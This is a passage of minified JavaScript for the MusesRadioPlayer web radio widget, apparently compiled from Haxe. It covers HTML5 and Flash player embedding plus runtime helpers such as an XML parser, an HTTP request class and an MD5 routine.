        : 1 == a.forceHTML5
        ? e.jsInsert(a)
        : e.browserSupportsCodec(a.codec)
        ? e.jsInsert(a)
        : FlashDetect.versionAtLeast(10, 1)
        ? (console.log(
            "MusesRadioPlayer will use Flash Version here since your browser does not support " +
              a.codec +
              " codec!"
          ),
          e.flashInsert(a))
        : (console.log(
            "MusesRadioPlayer will not work here, since your browser does not support " +
              a.codec +
              " codec and you don't have flash plugin installed!"
          ),
          e.jsInsert(a));
    };
    e.getMusesPlayerCounter = function () {
      return musesPlayerCounter++;
    };
    e.jsInsert = function (a) {
      null == a.elementId && null != e.elementId && (a.elementId = e.elementId);
      null == a.id && (a.id = e.objectId);
      e.createMusesStyleReset();
      var b = "MusesRadioPlayer-HTML5-player-" + e.getMusesPlayerCounter(),
        c =
          '<div id="' +
          b +
          '" class="musesStyleReset" style="overflow:hidden; width:' +
          a.width +
          "px;height:" +
          a.height +
          'px;"></div>';
      null == a.elementId
        ? window.document.write(c)
        : (window.document.getElementById(a.elementId).innerHTML = c);
      null != a.callbackFunction && e.setCallbackFunction(a.callbackFunction);
      a.elementId = b;
      a.skin = e.getSkin(a.skin, !1);
      b = e.jsInstances;
      c = a.id;
      a = new F(a);
      null != t[c] ? b.setReserved(c, a) : (b.h[c] = a);
    };
    e.flashInsert = function (a) {
      null == a.elementId && null != e.elementId && (a.elementId = e.elementId);
      null == a.id && (a.id = e.objectId);
      null == a.wmode && (a.wmode = "window");
      var b = "url=" + a.url;
      b += "&lang=" + (null != a.lang ? a.lang : "auto");
      b += "&codec=" + a.codec;
      b =
        b +
        "&tracking=true" +
        ("&volume=" + (null != a.volume ? a.volume : 100));
      null != a.introurl && (b += "&introurl=" + a.introurl);
      null != a.autoplay &&
        (b += "&autoplay=" + (a.autoplay ? "true" : "false"));
      null != a.jsevents &&
        (b += "&jsevents=" + (a.jsevents ? "true" : "false"));
      null != a.buffering && (b += "&buffering=" + a.buffering);
      null != a.metadataMode &&
        ((b += "&querymetadata=" + a.metadataMode),
        null != a.metadataProxy && (b += "&metadataproxy=" + a.metadataProxy),
        null != a.metadataInterval && (b += "&interval=" + a.metadataInterval));
      null != a.reconnectTime && (b += "&reconnecttime=" + a.reconnectTime);
      null != a.fallbackUrl && (b += "&fallback=" + a.fallbackUrl);
      b += "&skin=" + e.getSkin(a.skin, !0);
      b += "&title=" + a.title;
      b += "&welcome=" + a.welcome;
      var c = e.getScriptBaseHREF() + "/muses-hosted.swf",
        g = 'width="' + a.width + '" height="' + a.height + '" ';
      null != a.bgcolor && (g += 'bgcolor="' + a.bgcolor + '" ');
      var d =
        '<object id="' +
        a.id +
        '" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
        g +
        ">";
      d =
        d +
        ('<param name="movie" value="' + c + '" />') +
        ('<param name="flashvars" value="' + b + '" />') +
        ('<param name="wmode" value="' + a.wmode + '" />');
      d += '<param name="allowScriptAccess" value="always" />';
      d += '<param name="scale" value="noscale" />';
      null != a.bgcolor &&
        (d += '<param name="bgcolor" value="' + a.bgcolor + '" />');
      d +=
        '<embed name="' +
        a.id +
        '" src="' +
        c +
        '" flashvars="' +
        b +
        '" scale="noscale" wmode="' +
        a.wmode +
        '" ' +
        g +
        ' allowScriptAccess="always" type="application/x-shockwave-flash" />';
      d += "</object>";
      null != a.callbackFunction && e.setCallbackFunction(a.callbackFunction);
      null == a.elementId
        ? window.document.write(d)
        : (window.document.getElementById(a.elementId).innerHTML = d);
      b = null;
      eval("instance = document." + e.objectId + ";");
      null == b && (b = document.getElementById(e.objectId));
      a = a.id;
      c = e.flashInstances;
      null != t[a] ? c.setReserved(a, b) : (c.h[a] = b);
    };
    e.main = function () {
      e.getScriptBaseHREF();
    };
    Math.__name__ = ["Math"];
    var I = function () {};
    I.__name__ = ["Std"];
    I.string = function (a) {
      return x.__string_rec(a, "");
    };
    I.parseInt = function (a) {
      var b = parseInt(a, 10);
      0 != b || (120 != r.cca(a, 1) && 88 != r.cca(a, 1)) || (b = parseInt(a));
      return isNaN(b) ? null : b;
    };
    var N = function () {
      this.b = "";
    };
    N.__name__ = ["StringBuf"];
    N.prototype = { __class__: N };
    var y = function () {};
    y.__name__ = ["StringTools"];
    y.isSpace = function (a, b) {
      a = r.cca(a, b);
      return 8 < a && 14 > a ? !0 : 32 == a;
    };
    y.ltrim = function (a) {
      for (var b = a.length, c = 0; c < b && y.isSpace(a, c); ) ++c;
      return 0 < c ? r.substr(a, c, b - c) : a;
    };
    y.rtrim = function (a) {
      for (var b = a.length, c = 0; c < b && y.isSpace(a, b - c - 1); ) ++c;
      return 0 < c ? r.substr(a, 0, b - c) : a;
    };
    y.trim = function (a) {
      return y.ltrim(y.rtrim(a));
    };
    y.replace = function (a, b, c) {
      return a.split(b).join(c);
    };
    var Da = function () {};
    Da.__name__ = ["Type"];
    Da.getClassName = function (a) {
      a = a.__name__;
      return null == a ? null : a.join(".");
    };
    var h = function (a) {
      this.nodeType = a;
      this.children = [];
      this.attributeMap = new v();
    };
    h.__name__ = ["Xml"];
    h.parse = function (a) {
      return L.parse(a);
    };
    h.createElement = function (a) {
      var b = new h(h.Element);
      if (b.nodeType != h.Element)
        throw new p("Bad node type, expected Element but found " + b.nodeType);
      b.nodeName = a;
      return b;
    };
    h.createPCData = function (a) {
      var b = new h(h.PCData);
      if (b.nodeType == h.Document || b.nodeType == h.Element)
        throw new p("Bad node type, unexpected " + b.nodeType);
      b.nodeValue = a;
      return b;
    };
    h.createCData = function (a) {
      var b = new h(h.CData);
      if (b.nodeType == h.Document || b.nodeType == h.Element)
        throw new p("Bad node type, unexpected " + b.nodeType);
      b.nodeValue = a;
      return b;
    };
    h.createComment = function (a) {
      var b = new h(h.Comment);
      if (b.nodeType == h.Document || b.nodeType == h.Element)
        throw new p("Bad node type, unexpected " + b.nodeType);
      b.nodeValue = a;
      return b;
    };
    h.createDocType = function (a) {
      var b = new h(h.DocType);
      if (b.nodeType == h.Document || b.nodeType == h.Element)
        throw new p("Bad node type, unexpected " + b.nodeType);
      b.nodeValue = a;
      return b;
    };
    h.createProcessingInstruction = function (a) {
      var b = new h(h.ProcessingInstruction);
      if (b.nodeType == h.Document || b.nodeType == h.Element)
        throw new p("Bad node type, unexpected " + b.nodeType);
      b.nodeValue = a;
      return b;
    };
    h.createDocument = function () {
      return new h(h.Document);
    };
    h.prototype = {
      get: function (a) {
        if (this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element but found " + this.nodeType
          );
        var b = this.attributeMap;
        return null != t[a] ? b.getReserved(a) : b.h[a];
      },
      set: function (a, b) {
        if (this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element but found " + this.nodeType
          );
        var c = this.attributeMap;
        null != t[a] ? c.setReserved(a, b) : (c.h[a] = b);
      },
      exists: function (a) {
        if (this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element but found " + this.nodeType
          );
        var b = this.attributeMap;
        return null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a);
      },
      attributes: function () {
        if (this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element but found " + this.nodeType
          );
        return this.attributeMap.keys();
      },
      elements: function () {
        if (this.nodeType != h.Document && this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              this.nodeType
          );
        for (var a = [], b = 0, c = this.children; b < c.length; ) {
          var g = c[b];
          ++b;
          g.nodeType == h.Element && a.push(g);
        }
        return r.iter(a);
      },
      elementsNamed: function (a) {
        if (this.nodeType != h.Document && this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              this.nodeType
          );
        for (var b = [], c = 0, g = this.children; c < g.length; ) {
          var d = g[c];
          ++c;
          if (d.nodeType == h.Element) {
            if (d.nodeType != h.Element)
              throw new p(
                "Bad node type, expected Element but found " + d.nodeType
              );
            var f = d.nodeName == a;
          } else f = !1;
          f && b.push(d);
        }
        return r.iter(b);
      },
      firstElement: function () {
        if (this.nodeType != h.Document && this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              this.nodeType
          );
        for (var a = 0, b = this.children; a < b.length; ) {
          var c = b[a];
          ++a;
          if (c.nodeType == h.Element) return c;
        }
        return null;
      },
      addChild: function (a) {
        if (this.nodeType != h.Document && this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              this.nodeType
          );
        null != a.parent && a.parent.removeChild(a);
        this.children.push(a);
        a.parent = this;
      },
      removeChild: function (a) {
        if (this.nodeType != h.Document && this.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              this.nodeType
          );
        return r.remove(this.children, a) ? ((a.parent = null), !0) : !1;
      },
      __class__: h,
    };
    var Ha = function () {};
    Ha.__name__ = ["haxe", "IMap"];
    var T = function (a) {
      this.url = a;
      this.headers = new E();
      this.params = new E();
      this.async = !0;
      this.withCredentials = !1;
    };
    T.__name__ = ["haxe", "Http"];
    T.prototype = {
      setParameter: function (a, b) {
        this.params = J.filter(this.params, function (b) {
          return b.param != a;
        });
        this.params.push({ param: a, value: b });
        return this;
      },
      request: function (a) {
        var b = this;
        b.responseData = null;
        var c = (this.req = Ea.createXMLHttpRequest()),
          g = function (a) {
            if (4 == c.readyState) {
              try {
                var g = c.status;
              } catch (m) {
                g = null;
              }
              null != g &&
                "undefined" !== typeof window &&
                ((a = window.location.protocol.toLowerCase()),
                new D(
                  "^(?:about|app|app-storage|.+-extension|file|res|widget):$",
                  ""
                ).match(a) && (g = null != c.responseText ? 200 : 404));
              void 0 == g && (g = null);
              if (null != g) b.onStatus(g);
              if (null != g && 200 <= g && 400 > g)
                (b.req = null), b.onData((b.responseData = c.responseText));
              else if (null == g)
                (b.req = null), b.onError("Failed to connect or resolve host");
              else
                switch (g) {
                  case 12007:
                    b.req = null;
                    b.onError("Unknown host");
                    break;
                  case 12029:
                    b.req = null;
                    b.onError("Failed to connect to host");
                    break;
                  default:
                    (b.req = null),
                      (b.responseData = c.responseText),
                      b.onError("Http Error #" + c.status);
                }
            }
          };
        this.async && (c.onreadystatechange = g);
        var d = this.postData;
        if (null != d) a = !0;
        else
          for (var f = this.params.h; null != f; ) {
            var e = f.item;
            f = f.next;
            d = null == d ? "" : d + "&";
            var h = encodeURIComponent(e.param) + "=";
            d += h + encodeURIComponent(e.value);
          }
        try {
          if (a) c.open("POST", this.url, this.async);
          else if (null != d) {
            var n = 1 >= this.url.split("?").length;
            c.open("GET", this.url + (n ? "?" : "&") + d, this.async);
            d = null;
          } else c.open("GET", this.url, this.async);
        } catch (Aa) {
          Aa instanceof p && (Aa = Aa.val);
          b.req = null;
          this.onError(Aa.toString());
          return;
        }
        c.withCredentials = this.withCredentials;
        !J.exists(this.headers, function (a) {
          return "Content-Type" == a.header;
        }) &&
          a &&
          null == this.postData &&
          c.setRequestHeader(
            "Content-Type",
            "application/x-www-form-urlencoded"
          );
        for (a = this.headers.h; null != a; )
          (f = a.item), (a = a.next), c.setRequestHeader(f.header, f.value);
        c.send(d);
        this.async || g(null);
      },
      onData: function (a) {},
      onError: function (a) {},
      onStatus: function (a) {},
      __class__: T,
    };
    var G = function (a) {
      var b = this;
      this.id = setInterval(function () {
        b.run();
      }, a);
    };
    G.__name__ = ["haxe", "Timer"];
    G.delay = function (a, b) {
      var c = new G(b);
      c.run = function () {
        c.stop();
        a();
      };
      return c;
    };
    G.prototype = {
      stop: function () {
        null != this.id && (clearInterval(this.id), (this.id = null));
      },
      run: function () {},
      __class__: G,
    };
    var O = function () {};
    O.__name__ = ["haxe", "crypto", "Md5"];
    O.encode = function (a) {
      var b = new O();
      a = b.doEncode(O.str2blks(a));
      return b.hex(a);
    };
    O.str2blks = function (a) {
      var b = U.ofString(a),
        c = ((b.length + 8) >> 6) + 1;
      a = [];
      for (var g = 0, d = 16 * c; g < d; ) {
        var f = g++;
        a[f] = 0;
      }
      d = 0;
      f = b.length;
      for (g = 8 * f; d < f; )
        (a[d >> 2] |= b.b[d] << (((g + d) % 4) * 8)), ++d;
      a[d >> 2] |= 128 << (((g + d) % 4) * 8);
      b = 16 * c - 2;
      a[b] = g & 255;
      a[b] |= ((g >>> 8) & 255) << 8;
      a[b] |= ((g >>> 16) & 255) << 16;
      a[b] |= ((g >>> 24) & 255) << 24;
      return a;
    };
    O.prototype = {
      bitOR: function (a, b) {
        return (((a >>> 1) | (b >>> 1)) << 1) | (a & 1) | (b & 1);
      },
      bitXOR: function (a, b) {
        return (((a >>> 1) ^ (b >>> 1)) << 1) | ((a & 1) ^ (b & 1));
      },
      bitAND: function (a, b) {
        return (((a >>> 1) & (b >>> 1)) << 1) | (a & 1 & b & 1);
      },
      addme: function (a, b) {
        var c = (a & 65535) + (b & 65535);
        return (((a >> 16) + (b >> 16) + (c >> 16)) << 16) | (c & 65535);
      },
      hex: function (a) {
        for (var b = "", c = 0; c < a.length; ) {
          var g = a[c];
          ++c;
          for (var d = 0; 4 > d; ) {
            var f = d++;
            b +=
              "0123456789abcdef".charAt((g >> (8 * f + 4)) & 15) +
              "0123456789abcdef".charAt((g >> (8 * f)) & 15);
          }
        }
        return b;
      },
      rol: function (a, b) {
        return (a << b) | (a >>> (32 - b));
      },
      cmn: function (a, b, c, g, d, f) {
        return this.addme(
          this.rol(this.addme(this.addme(b, a), this.addme(g, f)), d),
          c
        );
      },
      ff: function (a, b, c, g, d, f, e) {
        return this.cmn(
          this.bitOR(this.bitAND(b, c), this.bitAND(~b, g)),
          a,
          b,
          d,
          f,
          e
        );
      },
      gg: function (a, b, c, g, d, f, e) {
        return this.cmn(
          this.bitOR(this.bitAND(b, g), this.bitAND(c, ~g)),
          a,
          b,
          d,
          f,
          e
        );
      },
      hh: function (a, b, c, g, d, f, e) {
        return this.cmn(this.bitXOR(this.bitXOR(b, c), g), a, b, d, f, e);
      },
      ii: function (a, b, c, g, d, f, e) {
        return this.cmn(this.bitXOR(c, this.bitOR(b, ~g)), a, b, d, f, e);
      },
      doEncode: function (a) {
        for (
          var b = 1732584193,
            c = -271733879,
            g = -1732584194,
            d = 271733878,
            f = 0;
          f < a.length;

        ) {
          var e = b,
            h = c,
            n = g,
            k = d;
          b = this.ff(b, c, g, d, a[f], 7, -680876936);
          d = this.ff(d, b, c, g, a[f + 1], 12, -389564586);
          g = this.ff(g, d, b, c, a[f + 2], 17, 606105819);
          c = this.ff(c, g, d, b, a[f + 3], 22, -1044525330);
          b = this.ff(b, c, g, d, a[f + 4], 7, -176418897);
          d = this.ff(d, b, c, g, a[f + 5], 12, 1200080426);
          g = this.ff(g, d, b, c, a[f + 6], 17, -1473231341);
          c = this.ff(c, g, d, b, a[f + 7], 22, -45705983);
          b = this.ff(b, c, g, d, a[f + 8], 7, 1770035416);
          d = this.ff(d, b, c, g, a[f + 9], 12, -1958414417);
          g = this.ff(g, d, b, c, a[f + 10], 17, -42063);
          c = this.ff(c, g, d, b, a[f + 11], 22, -1990404162);
          b = this.ff(b, c, g, d, a[f + 12], 7, 1804603682);
          d = this.ff(d, b, c, g, a[f + 13], 12, -40341101);
          g = this.ff(g, d, b, c, a[f + 14], 17, -1502002290);
          c = this.ff(c, g, d, b, a[f + 15], 22, 1236535329);
          b = this.gg(b, c, g, d, a[f + 1], 5, -165796510);
          d = this.gg(d, b, c, g, a[f + 6], 9, -1069501632);
          g = this.gg(g, d, b, c, a[f + 11], 14, 643717713);
          c = this.gg(c, g, d, b, a[f], 20, -373897302);
          b = this.gg(b, c, g, d, a[f + 5], 5, -701558691);
          d = this.gg(d, b, c, g, a[f + 10], 9, 38016083);
          g = this.gg(g, d, b, c, a[f + 15], 14, -660478335);
          c = this.gg(c, g, d, b, a[f + 4], 20, -405537848);
          b = this.gg(b, c, g, d, a[f + 9], 5, 568446438);
          d = this.gg(d, b, c, g, a[f + 14], 9, -1019803690);
          g = this.gg(g, d, b, c, a[f + 3], 14, -187363961);
          c = this.gg(c, g, d, b, a[f + 8], 20, 1163531501);
          b = this.gg(b, c, g, d, a[f + 13], 5, -1444681467);
          d = this.gg(d, b, c, g, a[f + 2], 9, -51403784);
          g = this.gg(g, d, b, c, a[f + 7], 14, 1735328473);
          c = this.gg(c, g, d, b, a[f + 12], 20, -1926607734);
          b = this.hh(b, c, g, d, a[f + 5], 4, -378558);
          d = this.hh(d, b, c, g, a[f + 8], 11, -2022574463);
          g = this.hh(g, d, b, c, a[f + 11], 16, 1839030562);
          c = this.hh(c, g, d, b, a[f + 14], 23, -35309556);
          b = this.hh(b, c, g, d, a[f + 1], 4, -1530992060);
          d = this.hh(d, b, c, g, a[f + 4], 11, 1272893353);
          g = this.hh(g, d, b, c, a[f + 7], 16, -155497632);
          c = this.hh(c, g, d, b, a[f + 10], 23, -1094730640);
          b = this.hh(b, c, g, d, a[f + 13], 4, 681279174);
          d = this.hh(d, b, c, g, a[f], 11, -358537222);
          g = this.hh(g, d, b, c, a[f + 3], 16, -722521979);
          c = this.hh(c, g, d, b, a[f + 6], 23, 76029189);
          b = this.hh(b, c, g, d, a[f + 9], 4, -640364487);
          d = this.hh(d, b, c, g, a[f + 12], 11, -421815835);
          g = this.hh(g, d, b, c, a[f + 15], 16, 530742520);
          c = this.hh(c, g, d, b, a[f + 2], 23, -995338651);
          b = this.ii(b, c, g, d, a[f], 6, -198630844);
          d = this.ii(d, b, c, g, a[f + 7], 10, 1126891415);
          g = this.ii(g, d, b, c, a[f + 14], 15, -1416354905);
          c = this.ii(c, g, d, b, a[f + 5], 21, -57434055);
          b = this.ii(b, c, g, d, a[f + 12], 6, 1700485571);
          d = this.ii(d, b, c, g, a[f + 3], 10, -1894986606);
          g = this.ii(g, d, b, c, a[f + 10], 15, -1051523);
          c = this.ii(c, g, d, b, a[f + 1], 21, -2054922799);
          b = this.ii(b, c, g, d, a[f + 8], 6, 1873313359);
          d = this.ii(d, b, c, g, a[f + 15], 10, -30611744);
          g = this.ii(g, d, b, c, a[f + 6], 15, -1560198380);
          c = this.ii(c, g, d, b, a[f + 13], 21, 1309151649);
          b = this.ii(b, c, g, d, a[f + 4], 6, -145523070);
          d = this.ii(d, b, c, g, a[f + 11], 10, -1120210379);
          g = this.ii(g, d, b, c, a[f + 2], 15, 718787259);
          c = this.ii(c, g, d, b, a[f + 9], 21, -343485551);
          b = this.addme(b, e);
          c = this.addme(c, h);
          g = this.addme(g, n);
          d = this.addme(d, k);
          f += 16;
        }
        return [b, c, g, d];
      },
      __class__: O,
    };
    var v = function () {
      this.h = {};
    };
    v.__name__ = ["haxe", "ds", "StringMap"];
    v.__interfaces__ = [Ha];
    v.prototype = {
      setReserved: function (a, b) {
        null == this.rh && (this.rh = {});
        this.rh["$" + a] = b;
      },
      getReserved: function (a) {
        return null == this.rh ? null : this.rh["$" + a];
      },
      existsReserved: function (a) {
        return null == this.rh ? !1 : this.rh.hasOwnProperty("$" + a);
      },
      keys: function () {
        return r.iter(this.arrayKeys());
      },
      arrayKeys: function () {
        var a = [],
          b;
        for (b in this.h) this.h.hasOwnProperty(b) && a.push(b);
        if (null != this.rh)
          for (b in this.rh) 36 == b.charCodeAt(0) && a.push(b.substr(1));
        return a;
      },
      __class__: v,
    };
    var U = function (a) {
      this.length = a.byteLength;
      this.b = new Ba(a);
      this.b.bufferValue = a;
      a.hxBytes = this;
      a.bytes = this.b;
    };
    U.__name__ = ["haxe", "io", "Bytes"];
    U.ofString = function (a) {
      for (var b = [], c = 0; c < a.length; ) {
        var d = a.charCodeAt(c++);
        55296 <= d &&
          56319 >= d &&
          (d = ((d - 55232) << 10) | (a.charCodeAt(c++) & 1023));
        127 >= d
          ? b.push(d)
          : (2047 >= d
              ? b.push(192 | (d >> 6))
              : (65535 >= d
                  ? b.push(224 | (d >> 12))
                  : (b.push(240 | (d >> 18)), b.push(128 | ((d >> 12) & 63))),
                b.push(128 | ((d >> 6) & 63))),
            b.push(128 | (d & 63)));
      }
      return new U(new Ba(b).buffer);
    };
    U.prototype = { __class__: U };
    var A = function (a, b, c) {
      this.xml = b;
      this.message = a;
      this.position = c;
      this.lineNumber = 1;
      for (a = this.positionAtLine = 0; a < c; ) {
        var d = a++;
        d = b.charCodeAt(d);
        10 == d
          ? (this.lineNumber++, (this.positionAtLine = 0))
          : 13 != d && this.positionAtLine++;
      }
    };
    A.__name__ = ["haxe", "xml", "XmlParserException"];
    A.prototype = {
      toString: function () {
        return (
          Da.getClassName(x.getClass(this)) +
          ": " +
          this.message +
          " at line " +
          this.lineNumber +
          " char " +
          this.positionAtLine
        );
      },
      __class__: A,
    };
    var L = function () {};
    L.__name__ = ["haxe", "xml", "Parser"];
    L.parse = function (a, b) {
      null == b && (b = !1);
      var c = h.createDocument();
      L.doParse(a, b, 0, c);
      return c;
    };
    L.doParse = function (a, b, c, d) {
      null == c && (c = 0);
      for (
        var g = null,
          f = 1,
          e = 1,
          k = null,
          n = 0,
          w = 0,
          u = 0,
          m = a.charCodeAt(c),
          l = new N(),
          q = 1,
          v = -1;
        m == m;

      ) {
        switch (f) {
          case 0:
            switch (m) {
              case 9:
              case 10:
              case 13:
              case 32:
                break;
              default:
                f = e;
                continue;
            }
            break;
          case 1:
            if (60 == m) (f = 0), (e = 2);
            else {
              n = c;
              f = 13;
              continue;
            }
            break;
          case 2:
            switch (m) {
              case 33:
                if (91 == a.charCodeAt(c + 1)) {
                  c += 2;
                  if ("CDATA[" != r.substr(a, c, 6).toUpperCase())
                    throw new p(new A("Expected <![CDATA[", a, c));
                  c += 5;
                  f = 17;
                } else if (
                  68 == a.charCodeAt(c + 1) ||
                  100 == a.charCodeAt(c + 1)
                ) {
                  if ("OCTYPE" != r.substr(a, c + 2, 6).toUpperCase())
                    throw new p(new A("Expected <!DOCTYPE", a, c));
                  c += 8;
                  f = 16;
                } else {
                  if (45 != a.charCodeAt(c + 1) || 45 != a.charCodeAt(c + 2))
                    throw new p(new A("Expected \x3c!--", a, c));
                  c += 2;
                  f = 15;
                }
                n = c + 1;
                break;
              case 47:
                if (null == d) throw new p(new A("Expected node name", a, c));
                n = c + 1;
                f = 0;
                e = 10;
                break;
              case 63:
                f = 14;
                n = c;
                break;
              default:
                f = 3;
                n = c;
                continue;
            }
            break;
          case 3:
            if (
              !(
                (97 <= m && 122 >= m) ||
                (65 <= m && 90 >= m) ||
                (48 <= m && 57 >= m) ||
                58 == m ||
                46 == m ||
                95 == m ||
                45 == m
              )
            ) {
              if (c == n) throw new p(new A("Expected node name", a, c));
              g = h.createElement(r.substr(a, n, c - n));
              d.addChild(g);
              ++w;
              f = 0;
              e = 4;
              continue;
            }
            break;
          case 4:
            switch (m) {
              case 47:
                f = 11;
                break;
              case 62:
                f = 9;
                break;
              default:
                f = 5;
                n = c;
                continue;
            }
            break;
          case 5:
            if (
              !(
                (97 <= m && 122 >= m) ||
                (65 <= m && 90 >= m) ||
                (48 <= m && 57 >= m) ||
                58 == m ||
                46 == m ||
                95 == m ||
                45 == m
              )
            ) {
              if (n == c) throw new p(new A("Expected attribute name", a, c));
              k = r.substr(a, n, c - n);
              if (g.exists(k))
                throw new p(new A("Duplicate attribute [" + k + "]", a, c));
              f = 0;
              e = 6;
              continue;
            }
            break;
          case 6:
            if (61 == m) (f = 0), (e = 7);
            else throw new p(new A("Expected =", a, c));
            break;
          case 7:
            switch (m) {
              case 34:
              case 39:
                l = new N();
                f = 8;
                n = c + 1;
                v = m;
                break;
              default:
                throw new p(new A('Expected "', a, c));
            }
            break;
          case 8:
            switch (m) {
              case 38:
                q = c - n;
                l.b += null == q ? r.substr(a, n, null) : r.substr(a, n, q);
                f = 18;
                q = 8;
                n = c + 1;
                break;
              case 60:
              case 62:
                if (b)
                  throw new p(
                    new A(
                      "Invalid unescaped " +
                        String.fromCharCode(m) +
                        " in attribute value",
                      a,
                      c
                    )
                  );
                m == v &&
                  ((e = c - n),
                  (l.b += null == e ? r.substr(a, n, null) : r.substr(a, n, e)),
                  (e = l.b),
                  (l = new N()),
                  g.set(k, e),
                  (f = 0),
                  (e = 4));
                break;
              default:
                m == v &&
                  ((e = c - n),
                  (l.b += null == e ? r.substr(a, n, null) : r.substr(a, n, e)),
                  (e = l.b),
                  (l = new N()),
                  g.set(k, e),
                  (f = 0),
                  (e = 4));
            }
            break;
          case 9:
            n = c = L.doParse(a, b, c, g);
            f = 1;
            break;
          case 10:
            if (
              !(
                (97 <= m && 122 >= m) ||
                (65 <= m && 90 >= m) ||
                (48 <= m && 57 >= m) ||
                58 == m ||
                46 == m ||
                95 == m ||
                45 == m
              )
            ) {
              if (n == c) throw new p(new A("Expected node name", a, c));
              e = r.substr(a, n, c - n);
              if (d.nodeType != h.Element)
                throw new p(
                  "Bad node type, expected Element but found " + d.nodeType
                );
              if (e != d.nodeName) {
                if (d.nodeType != h.Element)
                  throw new p(
                    "Bad node type, expected Element but found " + d.nodeType
                  );
                throw new p(new A("Expected </" + d.nodeName + ">", a, c));
              }
              f = 0;
              e = 12;
              continue;
            }
            break;
          case 11:
            if (62 == m) f = 1;
            else throw new p(new A("Expected >", a, c));
            break;
          case 12:
            if (62 == m) return 0 == w && d.addChild(h.createPCData("")), c;
            throw new p(new A("Expected >", a, c));
          case 13:
            60 == m
              ? ((e = c - n),
                (l.b += null == e ? r.substr(a, n, null) : r.substr(a, n, e)),
                (e = h.createPCData(l.b)),
                (l = new N()),
                d.addChild(e),
                ++w,
                (f = 0),
                (e = 2))
              : 38 == m &&
                ((q = c - n),
                (l.b += null == q ? r.substr(a, n, null) : r.substr(a, n, q)),
                (f = 18),
                (q = 13),
                (n = c + 1));
            break;
          case 14:
            63 == m &&
              62 == a.charCodeAt(c + 1) &&
              (++c,
              (m = r.substr(a, n + 1, c - n - 2)),
              d.addChild(h.createProcessingInstruction(m)),
              ++w,
              (f = 1));
            break;
          case 15:
            45 == m &&
              45 == a.charCodeAt(c + 1) &&
              62 == a.charCodeAt(c + 2) &&
              (d.addChild(h.createComment(r.substr(a, n, c - n))),
              ++w,
              (c += 2),
              (f = 1));
            break;
          case 16:
            91 == m
              ? ++u
              : 93 == m
              ? --u
              : 62 == m &&
                0 == u &&
                (d.addChild(h.createDocType(r.substr(a, n, c - n))),
                ++w,
                (f = 1));
            break;
          case 17:
            93 == m &&
              93 == a.charCodeAt(c + 1) &&
              62 == a.charCodeAt(c + 2) &&
              ((m = h.createCData(r.substr(a, n, c - n))),
              d.addChild(m),
              ++w,
              (c += 2),
              (f = 1));
            break;
          case 18:
            if (59 == m) {
              n = r.substr(a, n, c - n);
              if (35 == n.charCodeAt(0))
                (n =
                  120 == n.charCodeAt(1)
                    ? I.parseInt("0" + r.substr(n, 1, n.length - 1))
                    : I.parseInt(r.substr(n, 1, n.length - 1))),
                  (l.b += String.fromCharCode(n));
              else if (
                ((m = L.escapes),
                null != t[n] ? m.existsReserved(n) : m.h.hasOwnProperty(n))
              )
                (m = L.escapes),
                  (n = null != t[n] ? m.getReserved(n) : m.h[n]),
                  (l.b += I.string(n));
              else {
                if (b) throw new p(new A("Undefined entity: " + n, a, c));
                l.b += I.string("&" + n + ";");
              }
              n = c + 1;
              f = q;
            } else if (
              !(
                (97 <= m && 122 >= m) ||
                (65 <= m && 90 >= m) ||
                (48 <= m && 57 >= m) ||
                58 == m ||
                46 == m ||
                95 == m ||
                45 == m
              ) &&
              35 != m
            ) {
              if (b)
                throw new p(
                  new A(
                    "Invalid character in entity: " + String.fromCharCode(m),
                    a,
                    c
                  )
                );
              l.b += "&";
              m = c - n;
              l.b += null == m ? r.substr(a, n, null) : r.substr(a, n, m);
              n = c--;
              f = q;
            }
        }
        m = a.charCodeAt(++c);
      }
      1 == f && ((n = c), (f = 13));
      if (13 == f) {
        if (c != n || 0 == w)
          (b = c - n),
            (l.b += null == b ? r.substr(a, n, null) : r.substr(a, n, b)),
            d.addChild(h.createPCData(l.b));
        return c;
      }
      if (!b && 18 == f && 13 == q)
        return (
          (l.b += "&"),
          (b = c - n),
          (l.b += null == b ? r.substr(a, n, null) : r.substr(a, n, b)),
          d.addChild(h.createPCData(l.b)),
          c
        );
      throw new p(new A("Unexpected end", a, c));
    };
    var p = function (a) {
      Error.call(this);
      this.val = a;
      this.message = String(a);
      Error.captureStackTrace && Error.captureStackTrace(this, p);
    };
    p.__name__ = ["js", "_Boot", "HaxeError"];
    p.wrap = function (a) {
      return a instanceof Error ? a : new p(a);
    };
    p.__super__ = Error;
    p.prototype = k(Error.prototype, { __class__: p });
    var x = function () {};
    x.__name__ = ["js", "Boot"];
    x.getClass = function (a) {
      if (a instanceof Array && null == a.__enum__) return Array;
      var b = a.__class__;
      if (null != b) return b;
      a = x.__nativeClassName(a);
      return null != a ? x.__resolveNativeClass(a) : null;
    };
    x.__string_rec = function (a, b) {
      if (null == a) return "null";
      if (5 <= b.length) return "<...>";
      var c = typeof a;
      "function" == c && (a.__name__ || a.__ename__) && (c = "object");
      switch (c) {
        case "function":
          return "<function>";
        case "object":
          if (a instanceof Array) {
            if (a.__enum__) {
              if (2 == a.length) return a[0];
              c = a[0] + "(";
              b += "\t";
              for (var d = 2, e = a.length; d < e; ) {
                var f = d++;
                c =
                  2 != f
                    ? c + ("," + x.__string_rec(a[f], b))
                    : c + x.__string_rec(a[f], b);
              }
              return c + ")";
            }
            c = a.length;
            d = "[";
            b += "\t";
            for (e = 0; e < c; )
              (f = e++), (d += (0 < f ? "," : "") + x.__string_rec(a[f], b));
            return d + "]";
          }
          try {
            d = a.toString;
          } catch (Pa) {
            return "???";
          }
          if (
            null != d &&
            d != Object.toString &&
            "function" == typeof d &&
            ((c = a.toString()), "[object Object]" != c)
          )
            return c;
          c = null;
          d = "{\n";
          b += "\t";
          e = null != a.hasOwnProperty;
          for (c in a)
            (e && !a.hasOwnProperty(c)) ||
              "prototype" == c ||
              "__class__" == c ||
              "__super__" == c ||
